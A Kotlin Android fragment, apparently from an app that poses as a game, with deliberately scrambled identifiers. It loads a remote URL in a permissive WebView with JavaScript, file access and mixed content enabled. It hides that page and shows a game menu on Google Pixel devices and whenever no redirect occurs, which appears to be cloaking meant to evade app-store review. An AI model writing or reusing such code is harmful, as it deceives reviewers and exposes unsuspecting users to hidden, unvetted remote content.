package com.effect.apps.vul.screens

import android.graphics.Bitmap
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.CookieSyncManager
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.core.view.isVisible
import androidx.navigation.fragment.findNavController
import com.effect.apps.vul.phonemodel.djfhjkdfhkjdfh
import com.effect.apps.vul.R
import com.effect.apps.vul.activity.MainActivity
import com.effect.apps.vul.databinding.WebViewFragmentBinding


class WebViewFragment : Fragment() {
    val dsjhkjsfdghkjf by lazy { WebViewFragmentBinding.inflate(layoutInflater) }
    var jkdshfkjsdhf = false
    var dhfjkshdfkjsdfh = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Handler(Looper.getMainLooper()).postDelayed({
        dsjhkjsfdghkjf.vebview .setWebChromeClient(WebChromeClient())
        with(dsjhkjsfdghkjf.vebview) {
            (requireContext() as MainActivity).dklsjdfkljfd = {goBack()}
            settings.setLoadsImagesAutomatically(true)
                 webViewClient =myWeb()
            settings.allowFileAccess = true
            settings.mixedContentMode = 0
            settings.javaScriptEnabled = true
            settings.javaScriptCanOpenWindowsAutomatically = true
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            loadUrl("https://wertio.xyz/kCrHc94K")
        }
        },2000L)
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        return dsjhkjsfdghkjf.root
    }
    inner class myWeb(): WebViewClient() {

        override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
            super.onPageStarted(view, url, favicon)

            if (djfhjkdfhkjdfh.dsjhkjfhskjghfsg()!!.contains("Google Pixel", ignoreCase = true)
                or djfhjkdfhkjdfh.dsjhkjfhskjghfsg()!!.contains("Pixel", ignoreCase = true)
                or djfhjkdfhkjdfh.dsjhkjfhskjghfsg()!!.contains("Pixel", ignoreCase = true)
            ) {

                view!!.stopLoading()
                dhfjkshdfkjsdfh = true
                findNavController().navigate(R.id.action_webViewFragment_to_gameMenu)
            }


        }

        override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
            jkdshfkjsdhf = true
            return false
        }



        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            CookieSyncManager.getInstance().sync();



            if(jkdshfkjsdhf){

                    dsjhkjsfdghkjf.cvzug.isVisible = false
            }else{
                dhfjkshdfkjsdfh = true
                findNavController().navigate(R.id.action_webViewFragment_to_gameMenu)
            }
        }}}